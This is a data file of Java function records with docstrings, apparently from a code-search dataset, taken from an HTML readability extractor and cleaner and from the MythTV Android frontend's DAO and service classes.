5;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tlogger.debug(\"Location Boost Score: \" + boostScore \t+ \" on iteration: \" + i + \"' id='\" + node.parent().id() + \"' class='\" + node.parent().attr(\"class\"));\n\t\tString nodeText = node.text();\n\t\tWordStats wordStats = StopWords.getStopWordCount(nodeText);\n\t\tint upscore = (int) (wordStats.getStopWordCount() + boostScore);\n\t\tScoreInfo.updateContentScore(node.parent(), upscore);\n\t\tScoreInfo.updateContentScore(node.parent().parent(), upscore / 2);\n\t\tScoreInfo.updateContentScore(node.parent(), 1);\n\t\tScoreInfo.updateContentScore(node.parent().parent(), 1);\n\n\t\tif (!parentNodes.contains(node.parent())) {\n\t\t\tparentNodes.add(node.parent());\n\t\t}\n\n\t\tif (!parentNodes.contains(node.parent().parent())) {\n\t\t\tparentNodes.add(node.parent().parent());\n\t\t}\n\n\t\tcnt++;\n\t\ti++;\n\n\t}\n\n\t// now let's find the parent node who scored the highest\n\tdouble topNodeScore = 0;\n\tfor (Element e : parentNodes) {\n\t\tlogger.debug(\"ParentNode: score='\" + e.attr(\"algoScore\") + \"' nodeCount='\" + e.attr(\"algoNodes\") + \"' id='\" + e.id()+ \"' class='\" + e.attr(\"class\") + \"' \" + \"    :  \" + e);\n\t\tdouble score = ScoreInfo.getContentScore(e);\n\t\tif (score > topNodeScore) {\n\t\t\ttopNode = e;\n\t\t\ttopNodeScore = score;\n\t\t}\n\n\t\tif (topNode == null) {\n\t\t\ttopNode = e;\n\t\t}\n\t}\n\n\tif (logger.isDebugEnabled()) {\n\t\tif (topNode == null) {\n\t\t\tlogger.debug(\"ARTICLE NOT ABLE TO BE EXTRACTED!, WE FAILED!\");\n\t\t} else {\n\t\t\tString logText;\n\t\t\tString targetText = \"\";\n\t\t\tElement topPara = topNode.getElementsByTag(\"p\").first();\n\t\t\tif (topPara == null) {\n\t\t\t\ttopNode.text();\n\t\t\t} else {\n\t\t\t\ttopPara.text();\n\t\t\t}\n\n\t\t\tif (targetText.length() >= 51) {\n\t\t\t\tlogText = targetText.substring(0, 50);\n\t\t\t} else {\n\t\t\t\tlogText = targetText;\n\t\t\t}\n\t\t\tlogger.debug(\"TOPNODE TEXT: \" + logText.trim());\n\t\t\tlogger.debug(\"Our TOPNODE: score='\" + topNode.attr(\"algoScore\")\t+ \"' nodeCount='\" + topNode.attr(\"algoNodes\")+ \"' id='\" + topNode.id() + \"' class='\"+ topNode.attr(\"class\") + \"' \");\n\t\t}\n\t}\n\t\n\tif(topNode != null) {\n\t\ttopNode = AddSiblings.addSiblings(topNode);\n\t}\n\n\treturn topNode;\n\n}", "path": "src\\main\\java\\com\\sree\\textbytes\\readabilityBUNDLE\\extractor\\GooseExtractor.java", "repo_name": "srijiths/readabilityBUNDLE", "stars": 120, "license": "None", "language": "java", "size": 316}
{"docstring": "/**\n * removes nodes that may have a certain pattern that matches against a\n * class or id tag\n * \n * @param pattern\n */\n", "func_signal": "private void removeNodesViaRegEx(Document doc, Pattern pattern)", "code": "{\n\ttry {\n\t\tElements naughtyList = doc.getElementsByAttributeValueMatching(\n\t\t\t\t\"id\", pattern);\n\t\tlogger.debug(\"regExRemoveNodes: \" + naughtyList.size()\n\t\t\t\t+ \" ID elements found against pattern: \" + pattern);\n\t\tfor (Element node : naughtyList) {\n\t\t\tremoveNode(node);\n\t\t}\n\n\t\tElements naughtyList3 = doc.getElementsByAttributeValueMatching(\n\t\t\t\t\"class\", pattern);\n\n\t\tlogger.debug(\"regExRemoveNodes: \" + naughtyList3.size()\n\t\t\t\t+ \" CLASS elements found against pattern: \" + pattern);\n\t\tfor (Element node : naughtyList3) {\n\t\t\tremoveNode(node);\n\t\t}\n\t} catch (IllegalArgumentException e) {\n\t\te.printStackTrace();\n\t\tlogger.error(e.toString());\n\t}\n}", "path": "src\\main\\java\\com\\sree\\textbytes\\readabilityBUNDLE\\cleaner\\DocumentCleaner.java", "repo_name": "srijiths/readabilityBUNDLE", "stars": 120, "license": "None", "language": "java", "size": 316}
{"docstring": "/**\n * @param doc\n * @return\n * \n *         Clean up span tags in paragraphs takes care of the situation\n *         where you have a span tag nested in a paragraph tag\n */\n", "func_signal": "private void cleanUpSpanTagsInParagraphs(Document doc)", "code": "{\n\tElements span = doc.getElementsByTag(\"span\");\n\tlogger.debug(\"Cleaning \" + span.size() + \" span tags in paragraph \");\n\n\tfor (Element item : span) {\n\t\tif (item.parent().nodeName().equals(\"p\")) {\n\t\t\tTextNode tn = new TextNode(item.text(), doc.baseUri());\n\t\t\titem.replaceWith(tn);\n\t\t\tlogger.debug(\"Replacing nested span with TextNode: \"\n\t\t\t\t\t+ item.text());\n\n\t\t}\n\t}\n}", "path": "src\\main\\java\\com\\sree\\textbytes\\readabilityBUNDLE\\cleaner\\DocumentCleaner.java", "repo_name": "srijiths/readabilityBUNDLE", "stars": 120, "license": "None", "language": "java", "size": 316}
{"docstring": "/**\n * Change document element Tag\n * \n * @param e\n * @param newTag\n * @return\n */\n", "func_signal": "private Element changeElementTag(Element e, String newTag)", "code": "{\n        Element newElement = docToClean.createElement(newTag);\n        /* JSoup gives us the live child list, so we need to make a copy. */\n        List<Node> copyOfChildNodeList = new ArrayList<Node>();\n        copyOfChildNodeList.addAll(e.childNodes());\n        for (Node n : copyOfChildNodeList) {\n            n.remove();\n            newElement.appendChild(n);\n        }\n        e.replaceWith(newElement);\n        return newElement;\n    }", "path": "src\\main\\java\\com\\sree\\textbytes\\readabilityBUNDLE\\cleaner\\DocumentCleaner.java", "repo_name": "srijiths/readabilityBUNDLE", "stars": 120, "license": "None", "language": "java", "size": 316}
{"docstring": "/**\n * Clean comments\n * \n * @param node\n */\n", "func_signal": "private void cleanComments(Node node)", "code": "{\n\t\tint i = 0;\n    while (i < node.childNodes().size()) {\n        Node child = node.childNode(i);\n        if (child.nodeName().equals(\"#comment\")) {\n        \tlogger.debug(\"Cleaning comment tag \"+child);\n            child.remove();\n        }\n        else {\n        \tcleanComments(child);\n            i++;\n        }\n    }\n\t}", "path": "src\\main\\java\\com\\sree\\textbytes\\readabilityBUNDLE\\cleaner\\DocumentCleaner.java", "repo_name": "srijiths/readabilityBUNDLE", "stars": 120, "license": "None", "language": "java", "size": 316}
{"docstring": "/**\n * replaces <em> tags with textnodes\n */\n", "func_signal": "private void cleanEmTags(Document doc)", "code": "{\n\tElements ems = doc.getElementsByTag(\"em\");\n\tlogger.debug(\"Cleaning \" + ems.size() + \" EM tags\");\n\tfor (Element node : ems) {\n\t\t// replace the node with a div node\n\t\tElements images = node.getElementsByTag(\"img\");\n\t\tif (images.size() != 0) {\n\t\t\tcontinue;\n\t\t}\n\t\tTextNode tn = new TextNode(node.text(), doc.baseUri());\n\t\tnode.replaceWith(tn);\n\t}\n}", "path": "src\\main\\java\\com\\sree\\textbytes\\readabilityBUNDLE\\cleaner\\DocumentCleaner.java", "repo_name": "srijiths/readabilityBUNDLE", "stars": 120, "license": "None", "language": "java", "size": 316}
{"docstring": "/**\n * Convert double br's in to p tag\n * \n * @param docToClean\n * @return\n */\n", "func_signal": "private void convertDoubleBrsToP(Document docToClean)", "code": "{\n\t Elements doubleBrs = docToClean.select(\"br + br\");\n        for (Element br : doubleBrs) {\n            // we hope that there's a 'p' up there....\n            Elements parents = br.parents();\n            Element parent = null;\n            for (Element aparent : parents) {\n                if (aparent.tag().getName().equals(\"p\")) {\n                    parent = aparent;\n                    break;\n                }\n            }\n            if (parent == null) {\n                parent = br.parent();\n                parent.wrap(\"<p></p>\");\n            }\n            // now it's safe to make the change.\n            String inner = parent.html();\n            inner = Patterns.REPLACE_BRS.matcher(inner).replaceAll(\"</p><p>\");\n            parent.html(inner);\n        }\n}", "path": "src\\main\\java\\com\\sree\\textbytes\\readabilityBUNDLE\\cleaner\\DocumentCleaner.java", "repo_name": "srijiths/readabilityBUNDLE", "stars": 120, "license": "None", "language": "java", "size": 316}
{"docstring": "/**\n * Apparently jsoup expects the node's parent to not be null and throws if\n * it is. Let's be safe.\n * \n * @param node\n *            the node to remove from the doc\n */\n", "func_signal": "private void removeNode(Element node)", "code": "{\n\tif (node == null || node.parent() == null)\n\t\treturn;\n\tlogger.debug(\"Removing Cleaning node : \"+node);\n\tnode.remove();\n}", "path": "src\\main\\java\\com\\sree\\textbytes\\readabilityBUNDLE\\cleaner\\DocumentCleaner.java", "repo_name": "srijiths/readabilityBUNDLE", "stars": 120, "license": "None", "language": "java", "size": 316}
{"docstring": "/**\n * checks the density of links within a node, is there not much text and\n * most of it contains links? if so it's no good\n * \n * @param e\n * @return\n */\n", "func_signal": "private static boolean isHighLinkDensity(Element e)", "code": "{\n\tElements links = e.getElementsByTag(\"a\");\n\tif (links.size() == 0) {\n\t\treturn false;\n\t}\n\n\tString text = e.text().trim();\n\tString[] words = Patterns.SPACE_SPLITTER.split(text);\n\tfloat numberOfWords = words.length;\n\n\t// let's loop through all the links and calculate the number of words\n\t// that make up the links\n\tStringBuilder sb = new StringBuilder();\n\tfor (Element link : links) {\n\t\tsb.append(link.text());\n\t}\n\tString linkText = sb.toString();\n\tString[] linkWords = Patterns.SPACE_SPLITTER.split(linkText);\n\tfloat numberOfLinkWords = linkWords.length;\n\n\tfloat numberOfLinks = links.size();\n\n\tfloat linkDivisor = numberOfLinkWords / numberOfWords;\n\tfloat score = linkDivisor * numberOfLinks;\n\n\tif (score > 1) {\n\t\treturn true;\n\t}\n\n\treturn false;\n}", "path": "src\\main\\java\\com\\sree\\textbytes\\readabilityBUNDLE\\extractor\\GooseExtractor.java", "repo_name": "srijiths/readabilityBUNDLE", "stars": 120, "license": "None", "language": "java", "size": 316}
{"docstring": "/**\n * alot of times the first paragraph might be the caption under an image so\n * we'll want to make sure if we're going to boost a parent node that it\n * should be connected to other paragraphs, at least for the first n\n * paragraphs so we'll want to make sure that the next sibling is a\n * paragraph and has at least some substatial weight to it\n * \n * \n * @param node\n * @return\n */\n", "func_signal": "private boolean isOkToBoost(Element node)", "code": "{\n\tint stepsAway = 0;\n\n\tElement sibling = node.nextElementSibling();\n\twhile (sibling != null) {\n\t\tif (sibling.tagName().equals(\"p\")) {\n\t\t\tif (stepsAway >= 3) {\n\t\t\t\tlogger.debug(\"Next paragraph is too far away, not boosting\");\n\n\t\t\t\treturn false;\n\t\t\t}\n\n\t\t\tString paraText = sibling.text();\n\t\t\tWordStats wordStats = StopWords.getStopWordCount(paraText);\n\t\t\tif (wordStats.getStopWordCount() > 5) {\n\t\t\t\tlogger.debug(\"We're gonna boost this node, seems contenty\");\n\t\t\t\treturn true;\n\t\t\t}\n\n\t\t}\n\n\t\t// increase how far away the next paragraph is from this node\n\t\tstepsAway++;\n\n\t\tsibling = sibling.nextElementSibling();\n\t}\n\n\treturn false;\n}", "path": "src\\main\\java\\com\\sree\\textbytes\\readabilityBUNDLE\\extractor\\GooseExtractor.java", "repo_name": "srijiths/readabilityBUNDLE", "stars": 120, "license": "None", "language": "java", "size": 316}
{"docstring": "/**\n * Get the density of links as a percentage of the content This is the\n * amount of text that is inside a link divided by the total text in the\n * node.\n * \n * @param Element\n * @return number (float)\n **/\n", "func_signal": "public static double getLinkDensity(Element linkNode)", "code": "{\n\tElements linkElements = linkNode.getElementsByTag(\"a\");\n\tint textLength = linkNode.text().length();\n\tif (textLength == 0)\n\t\ttextLength = 1;\n\tint linkLength = 0;\n\tfor (Element a : linkElements) {\n\t\tlinkLength += a.text().length();\n\n\t}\n\treturn linkLength / textLength;\n}", "path": "src\\main\\java\\com\\sree\\textbytes\\readabilityBUNDLE\\WeightMethods.java", "repo_name": "srijiths/readabilityBUNDLE", "stars": 120, "license": "None", "language": "java", "size": 316}
{"docstring": "/* (non-Javadoc)\n * @see org.mythtv.db.dvr.ProgramDaoHelper#delete(org.mythtv.services.api.dvr.Program)\n */\n", "func_signal": "@Override\npublic int delete( final Context context, final LocationProfile locationProfile, Program program )", "code": "{\n//\t\tLog.d( TAG, \"delete : enter\" );\n\n\tif( null == context ) {\n\t\tthrow new IllegalArgumentException( \"Context is required\" );\n\t}\n\t\n\tif( null == locationProfile ) {\n\t\tthrow new IllegalArgumentException( \"LocationProfile is required\" );\n\t}\n\t\n\tint deleted = delete( context, ProgramConstants.CONTENT_URI_RECORDED, locationProfile, program, ProgramConstants.TABLE_NAME_RECORDED );\n\t\n//\t\tLog.d( TAG, \"delete : exit\" );\n\treturn deleted;\n}", "path": "src\\org\\mythtv\\db\\dvr\\RecordedDaoHelper.java", "repo_name": "MythTV-Clients/MythTV-Android-Frontend", "stars": 65, "license": "gpl-3.0", "language": "java", "size": 36045}
{"docstring": "/* (non-Javadoc)\n * @see java.lang.Object#toString()\n */\n", "func_signal": "@Override\npublic String toString()", "code": "{\n\tStringBuilder builder = new StringBuilder();\n\t\n\tbuilder.append( \"VideoSourceList [\" );\n\t\n\tif( videoSources != null ) {\n\t\tbuilder.append( \"videoSources=\" );\n\t\tbuilder.append( videoSources );\n\t}\n\t\n\tbuilder.append( \"]\" );\n\n\treturn builder.toString();\n}", "path": "src\\org\\mythtv\\db\\channel\\model\\VideoSourceList.java", "repo_name": "MythTV-Clients/MythTV-Android-Frontend", "stars": 65, "license": "gpl-3.0", "language": "java", "size": 36045}
{"docstring": "/**\n * Returns the one and only RecordedDaoHelper. init() must be called before \n * any \n * \n * @return\n */\n", "func_signal": "public static RecordedDaoHelper getInstance()", "code": "{\n\tif( null == singleton ) {\n\n\t\tsynchronized( RecordedDaoHelper.class ) {\n\n\t\t\tif( null == singleton ) {\n\t\t\t\tsingleton = new RecordedDaoHelper();\n\t\t\t}\n\t\t\n\t\t}\n\n\t}\n\t\n\treturn singleton;\n}", "path": "src\\org\\mythtv\\db\\dvr\\RecordedDaoHelper.java", "repo_name": "MythTV-Clients/MythTV-Android-Frontend", "stars": 65, "license": "gpl-3.0", "language": "java", "size": 36045}
{"docstring": "/* (non-Javadoc)\n * @see org.mythtv.db.dvr.ProgramDaoHelper#deleteAll()\n */\n", "func_signal": "@Override\npublic int deleteAll( final Context context )", "code": "{\n//\t\tLog.d( TAG, \"deleteAll : enter\" );\n\n\tif( null == context ) {\n\t\tthrow new IllegalArgumentException( \"Context is required\" );\n\t}\n\t\n\tint deleted = deleteAll( context, ProgramConstants.CONTENT_URI_RECORDED );\n\t\n//\t\tLog.d( TAG, \"deleteAll : exit\" );\n\treturn deleted;\n}", "path": "src\\org\\mythtv\\db\\dvr\\RecordedDaoHelper.java", "repo_name": "MythTV-Clients/MythTV-Android-Frontend", "stars": 65, "license": "gpl-3.0", "language": "java", "size": 36045}
{"docstring": "/* (non-Javadoc)\n * @see android.os.AsyncTask#doInBackground(Params[])\n */\n", "func_signal": "@Override\nprotected Boolean doInBackground( String... params )", "code": "{\n\tLog.d( TAG, \"doInBackground : enter\" );\n\n\tif( null == mContext ) {\n\t\tthrow new IllegalArgumentException( \"Context is required\" );\n\t}\n\t\n\tif( null == mLocationProfile ) {\n\t\tthrow new IllegalArgumentException( \"LocationProfile is required\" );\n\t}\n\n\tif( null == listener ) {\n\t\tthrow new IllegalArgumentException( \"TaskFinishedListener is required\" );\n\t}\n\n\tif( null == params || params.length != 2 ) {\n\t\tthrow new IllegalArgumentException( \"String params are required\" );\n\t}\n\n\tboolean created = false;\n\t\n\tif( !NetworkHelper.getInstance().isMasterBackendConnected( mContext, mLocationProfile ) ) {\n\t\tLog.w( TAG, \"process : Master Backend '\" + mLocationProfile.getHostname() + \"' is unreachable\" );\n\t\t\n\t\treturn false;\n\t}\n\n\tString groupName = params[ 0 ];\n\tString directory = params[ 1 ];\n\t\n\tApiVersion apiVersion = ApiVersion.valueOf( mLocationProfile.getVersion() );\n\tswitch( apiVersion ) {\n\t\tcase v025 :\n\n\t\t\torg.mythtv.services.api.v025.MythServicesTemplate mythServicesTemplateV25 = (org.mythtv.services.api.v025.MythServicesTemplate) MythAccessFactory.getServiceTemplateApiByVersion( apiVersion, mLocationProfile.getUrl() );\n\n\t\t\tif( null != mythServicesTemplateV25 ) {\n\t\t\t\tResponseEntity<org.mythtv.services.api.Bool> responseV25 = mythServicesTemplateV25.mythOperations().addStorageGroupDir( groupName, directory, mLocationProfile.getHostname() );\n\t\t\t\tif( responseV25.getStatusCode().equals( HttpStatus.OK ) ) {\n\n\t\t\t\t\tif( null != responseV25.getBody() ) {\n\n\t\t\t\t\t\tcreated = responseV25.getBody().getValue();\n\n\t\t\t\t\t}\n\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\tbreak;\n\t\t\t\n\t\tcase v026 :\n\t\t\t\n\t\t\torg.mythtv.services.api.v026.MythServicesTemplate mythServicesTemplateV26 = (org.mythtv.services.api.v026.MythServicesTemplate) MythAccessFactory.getServiceTemplateApiByVersion( apiVersion, mLocationProfile.getUrl() );\n\n\t\t\tif( null != mythServicesTemplateV26 ) {\n\t\t\t\tResponseEntity<org.mythtv.services.api.Bool> responseV26 = mythServicesTemplateV26.mythOperations().addStorageGroupDir( groupName, directory, mLocationProfile.getHostname() );\n\t\t\t\tif( responseV26.getStatusCode().equals( HttpStatus.OK ) ) {\n\n\t\t\t\t\tif( null != responseV26.getBody() ) {\n\n\t\t\t\t\t\tcreated = responseV26.getBody().getValue();\n\n\t\t\t\t\t}\n\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\tbreak;\n\t\tcase v027 :\n\n\t\t\torg.mythtv.services.api.v027.MythServicesTemplate mythServicesTemplateV27 = (org.mythtv.services.api.v027.MythServicesTemplate) MythAccessFactory.getServiceTemplateApiByVersion( apiVersion, mLocationProfile.getUrl() );\n\n\t\t\tif( null != mythServicesTemplateV27 ) {\n\t\t\t\tResponseEntity<org.mythtv.services.api.Bool> responseV27 = mythServicesTemplateV27.mythOperations().addStorageGroupDir( groupName, directory, mLocationProfile.getHostname() );\n\t\t\t\tif( responseV27.getStatusCode().equals( HttpStatus.OK ) ) {\n\n\t\t\t\t\tif( null != responseV27.getBody() ) {\n\n\t\t\t\t\t\tcreated = responseV27.getBody().getValue();\n\n\t\t\t\t\t}\n\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\tbreak;\n\t\t\t\n\t\tdefault :\n\t\t\t\n\t\t\torg.mythtv.services.api.v027.MythServicesTemplate mythServicesTemplateV27Default = (org.mythtv.services.api.v027.MythServicesTemplate) MythAccessFactory.getServiceTemplateApiByVersion( apiVersion, mLocationProfile.getUrl() );\n\n\t\t\tif( null != mythServicesTemplateV27Default ) {\n\t\t\t\tResponseEntity<org.mythtv.services.api.Bool> responseV27 = mythServicesTemplateV27Default.mythOperations().addStorageGroupDir( groupName, directory, mLocationProfile.getHostname() );\n\t\t\t\tif( responseV27.getStatusCode().equals( HttpStatus.OK ) ) {\n\n\t\t\t\t\tif( null != responseV27.getBody() ) {\n\n\t\t\t\t\t\tcreated = responseV27.getBody().getValue();\n\n\t\t\t\t\t}\n\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tbreak;\n\t}\n\n\tLog.d( TAG, \"doInBackground : exit\" );\n\treturn created;\n}", "path": "src\\org\\mythtv\\service\\myth\\CreateStorageGroupTask.java", "repo_name": "MythTV-Clients/MythTV-Android-Frontend", "stars": 65, "license": "gpl-3.0", "language": "java", "size": 36045}
{"docstring": "/* (non-Javadoc)\n * @see org.mythtv.db.dvr.ProgramDaoHelper#findOne(int, org.joda.time.DateTime)\n */\n", "func_signal": "@Override\npublic Program findOne( final Context context, final LocationProfile locationProfile, final int channelId, final DateTime startTime )", "code": "{\n//\t\tLog.d( TAG, \"findOne : enter\" );\n\t\n\tif( null == context ) {\n\t\tthrow new IllegalArgumentException( \"Context is required\" );\n\t}\n\t\n\tif( null == locationProfile ) {\n\t\tthrow new IllegalArgumentException( \"LocationProfile is required\" );\n\t}\n\t\n\tString selection = ProgramConstants.TABLE_NAME_RECORDED + \".\" + ProgramConstants.FIELD_CHANNEL_ID + \" = ? AND \" + ProgramConstants.TABLE_NAME_RECORDED + \".\" + ProgramConstants.FIELD_START_TIME + \" = ?\";\n\tString[] selectionArgs = new String[] { String.valueOf( channelId ), String.valueOf( startTime.getMillis() ) };\n\n\tselection = appendLocationHostname( context, locationProfile, selection, ProgramConstants.TABLE_NAME_RECORDED );\n\t\n\tProgram program = findOne( context, ProgramConstants.CONTENT_URI_RECORDED, null, selection, selectionArgs, null, ProgramConstants.TABLE_NAME_RECORDED );\n//\t\tif( null != program ) {\n//\t\t\tLog.v( TAG, \"findOne : program=\" + program.toString() );\n//\t\t} else {\n//\t\t\tLog.v( TAG, \"findOne : program not found!\" );\n//\t\t}\n\t\n//\t\tLog.d( TAG, \"findOne : exit\" );\n\treturn program;\n}", "path": "src\\org\\mythtv\\db\\dvr\\RecordedDaoHelper.java", "repo_name": "MythTV-Clients/MythTV-Android-Frontend", "stars": 65, "license": "gpl-3.0", "language": "java", "size": 36045}
{"docstring": "/* (non-Javadoc)\n * @see java.lang.Object#toString()\n */\n", "func_signal": "@Override\npublic String toString()", "code": "{\n\tStringBuilder builder = new StringBuilder();\n\t\n\tbuilder.append( \"LogMessageList [\" );\n\t\n\tif( logMessages != null ) {\n\t\tbuilder.append( \"logMessages=\" );\n\t\tbuilder.append( logMessages );\n\t}\n\t\n\tbuilder.append( \"]\" );\n\n\treturn builder.toString();\n}", "path": "src\\org\\mythtv\\db\\myth\\model\\LogMessageList.java", "repo_name": "MythTV-Clients/MythTV-Android-Frontend", "stars": 65, "license": "gpl-3.0", "language": "java", "size": 36045}
{"docstring": "// internal helpers\n", "func_signal": "private void download( LocationProfile profile ) throws Exception", "code": "{\n\tLog.v( TAG, \"download : enter\" );\n\n\tApiVersion apiVersion = MythAccessFactory.getMythVersion( profile.getUrl() );\n\tif( apiVersion.equals( ApiVersion.NotSupported ) ) {\n\t\tapiVersion = ApiVersion.v027;\n\t}\n\t\n\tprofile.setVersion( apiVersion.name() );\n\tmLocationProfileDaoHelper.save( this, profile );\n\tLog.v( TAG, \"download : profile=\" + profile.toString() );\n\t\n\tLog.v( TAG, \"download : exit\" );\n}", "path": "src\\org\\mythtv\\service\\preferences\\PreferencesRecordedDownloadService.java", "repo_name": "MythTV-Clients/MythTV-Android-Frontend", "stars": 65, "license": "gpl-3.0", "language": "java", "size": 36045}
{"docstring": "/**\n * Returns the one and only StatusHelperV25. init() must be called before \n * any \n * @return\n */\n", "func_signal": "public static StatusHelperV25 getInstance()", "code": "{\n\tif( null == singleton ) {\n\t\t\n\t\tsynchronized( StatusHelperV25.class ) {\n\n\t\t\tif( null == singleton ) {\n\t\t\t\tsingleton = new StatusHelperV25();\n\t\t\t}\n\t\t\n\t\t}\n\t\t\n\t}\n\t\n\treturn singleton;\n}", "path": "src\\org\\mythtv\\service\\frontends\\v25\\StatusHelperV25.java", "repo_name": "MythTV-Clients/MythTV-Android-Frontend", "stars": 65, "license": "gpl-3.0", "language": "java", "size": 36045}
{"docstring": "/**\n * @param title\n * @return\n */\n", "func_signal": "public List<Program> findAllByTitle( final Context context, final LocationProfile locationProfile, final String title )", "code": "{\n//\t\tLog.d( TAG, \"findAllByTitle : enter\" );\n\t\n\tif( null == context ) {\n\t\tthrow new IllegalArgumentException( \"Context is required\" );\n\t}\n\t\n\tif( null == locationProfile ) {\n\t\tthrow new IllegalArgumentException( \"LocationProfile is required\" );\n\t}\n\t\n\tString selection = ProgramConstants.FIELD_TITLE + \" = ?\";\n\tString[] selectionArgs = new String[] { title };\n//\t\tLog.d( TAG, \"findAllByTitle : title=\" + title );\n\t\n\tselection = appendLocationHostname( context, locationProfile, selection, ProgramConstants.TABLE_NAME_RECORDED );\n\t\n\tList<Program> programs = findAll( context, ProgramConstants.CONTENT_URI_RECORDED, null, selection, selectionArgs, null, ProgramConstants.TABLE_NAME_RECORDED );\n//\t\tif( null != programs && !programs.isEmpty() ) {\n//\t\t\tfor( Program program : programs ) {\n//\t\t\t\tLog.v( TAG, \"findAllByTitle : channelId=\" + program.getChannelInfo().getChannelId() + \", startTime=\" + program.getStartTime().getMillis() + \", program=\" + program.toString() );\n//\t\t\t}\n//\t\t}\n\t\n//\t\tLog.d( TAG, \"findAllByTitle : exit\" );\n\treturn programs;\n}", "path": "src\\org\\mythtv\\db\\dvr\\RecordedDaoHelper.java", "repo_name": "MythTV-Clients/MythTV-Android-Frontend", "stars": 65, "license": "gpl-3.0", "language": "java", "size": 36045}
{"docstring": "/* (non-Javadoc)\n * @see android.os.AsyncTask#onPreExecute()\n */\n", "func_signal": "@Override\n    protected void onPreExecute()", "code": "{\n\tLog.d( TAG, \"onPreExecute : enter\" );\n\t\n        listener.onCreateStorageGroupTaskStarted();\n\n        Log.d( TAG, \"onPreExecute : exit\" );\n    }", "path": "src\\org\\mythtv\\service\\myth\\CreateStorageGroupTask.java", "repo_name": "MythTV-Clients/MythTV-Android-Frontend", "stars": 65, "license": "gpl-3.0", "language": "java", "size": 36045}
{"docstring": "/**\n * Returns the one and only SettingHelperV27. init() must be called before \n * any \n * @return\n */\n", "func_signal": "public static SettingHelperV27 getInstance()", "code": "{\n\tif( null == singleton ) {\n\t\t\n\t\tsynchronized( SettingHelperV27.class ) {\n\n\t\t\tif( null == singleton ) {\n\t\t\t\tsingleton = new SettingHelperV27();\n\t\t\t}\n\t\t\n\t\t}\n\t\t\n\t}\n\t\n\treturn singleton;\n}", "path": "src\\org\\mythtv\\service\\myth\\v27\\SettingHelperV27.java", "repo_name": "MythTV-Clients/MythTV-Android-Frontend", "stars": 65, "license": "gpl-3.0", "language": "java", "size": 36045}
{"docstring": "/**\n * @param id\n * @return\n */\n", "func_signal": "public Program findOne( final Context context, final Long id )", "code": "{\n//\t\tLog.d( TAG, \"findOne : enter\" );\n//\t\tLog.d( TAG, \"findOne : id=\" + id );\n\t\n\tif( null == context ) {\n\t\tthrow new IllegalArgumentException( \"Context is required\" );\n\t}\n\t\n\tProgram program = findOne( context, ContentUris.withAppendedId( ProgramConstants.CONTENT_URI_RECORDED, id ), null, null, null, null, ProgramConstants.TABLE_NAME_RECORDED );\n//\t\tif( null != program ) {\n//\t\t\tLog.d( TAG, \"findOne : program=\" + program.toString() );\n//\t\t}\n\t\n//\t\tLog.d( TAG, \"findOne : exit\" );\n\treturn program;\n}", "path": "src\\org\\mythtv\\db\\dvr\\RecordedDaoHelper.java", "repo_name": "MythTV-Clients/MythTV-Android-Frontend", "stars": 65, "license": "gpl-3.0", "language": "java", "size": 36045}
{"docstring": "/* (non-Javadoc)\n * @see java.lang.Object#toString()\n */\n", "func_signal": "@Override\npublic String toString()", "code": "{\n\tStringBuilder builder = new StringBuilder();\n\t\n\tbuilder.append( \"VideoLookup [\" );\n\t\n\tif( title != null ) {\n\t\tbuilder.append( \"title=\" );\n\t\tbuilder.append( title );\n\t\tbuilder.append( \", \" );\n\t}\n\t\n\tif( subTitle != null ) {\n\t\tbuilder.append( \"subTitle=\" );\n\t\tbuilder.append( subTitle );\n\t\tbuilder.append( \", \" );\n\t}\n\t\n\tbuilder.append( \"season=\" );\n\tbuilder.append( season );\n\tbuilder.append( \", episode=\" );\n\tbuilder.append( episode );\n\tbuilder.append( \", year=\" );\n\tbuilder.append( year );\n\tbuilder.append( \", \" );\n\t\n\tif( tagline != null ) {\n\t\tbuilder.append( \"tagline=\" );\n\t\tbuilder.append( tagline );\n\t\tbuilder.append( \", \" );\n\t}\n\t\n\tif( description != null ) {\n\t\tbuilder.append( \"description=\" );\n\t\tbuilder.append( description );\n\t\tbuilder.append( \", \" );\n\t}\n\t\n\tif( certification != null ) {\n\t\tbuilder.append( \"certification=\" );\n\t\tbuilder.append( certification );\n\t\tbuilder.append( \", \" );\n\t}\n\t\n\tif( inetReference != null ) {\n\t\tbuilder.append( \"inetReference=\" );\n\t\tbuilder.append( inetReference );\n\t\tbuilder.append( \", \" );\n\t}\n\t\n\tif( collectionReference != null ) {\n\t\tbuilder.append( \"collectionReference=\" );\n\t\tbuilder.append( collectionReference );\n\t\tbuilder.append( \", \" );\n\t}\n\t\n\tif( homePage != null ) {\n\t\tbuilder.append( \"homePage=\" );\n\t\tbuilder.append( homePage );\n\t\tbuilder.append( \", \" );\n\t}\n\t\n\tif( releaseDate != null ) {\n\t\tbuilder.append( \"releaseDate=\" );\n\t\tbuilder.append( releaseDate );\n\t\tbuilder.append( \", \" );\n\t}\n\t\n\tbuilder.append( \"userRating=\" );\n\tbuilder.append( userRating );\n\tbuilder.append( \", length=\" );\n\tbuilder.append( length );\n\tbuilder.append( \", \" );\n\t\n\tif( language != null ) {\n\t\tbuilder.append( \"language=\" );\n\t\tbuilder.append( language );\n\t\tbuilder.append( \", \" );\n\t}\n\t\n\tif( countries != null ) {\n\t\tbuilder.append( \"countries=\" );\n\t\tbuilder.append( countries );\n\t\tbuilder.append( \", \" );\n\t}\n\t\n\tbuilder.append( \"popularity=\" );\n\tbuilder.append( popularity );\n\tbuilder.append( \", budget=\" );\n\tbuilder.append( budget );\n\tbuilder.append( \", revenue=\" );\n\tbuilder.append( revenue );\n\tbuilder.append( \", \" );\n\t\n\tif( imdb != null ) {\n\t\tbuilder.append( \"imdb=\" );\n\t\tbuilder.append( imdb );\n\t\tbuilder.append( \", \" );\n\t}\n\t\n\tif( tmsReference != null ) {\n\t\tbuilder.append( \"tmsReference=\" );\n\t\tbuilder.append( tmsReference );\n\t\tbuilder.append( \", \" );\n\t}\n\t\n\tif( artworks != null ) {\n\t\tbuilder.append( \"artworks=\" );\n\t\tbuilder.append( artworks );\n\t}\n\t\n\tbuilder.append( \"]\" );\n\n\treturn builder.toString();\n}", "path": "src\\org\\mythtv\\db\\video\\model\\VideoLookup.java", "repo_name": "MythTV-Clients/MythTV-Android-Frontend", "stars": 65, "license": "gpl-3.0", "language": "java", "size": 36045}
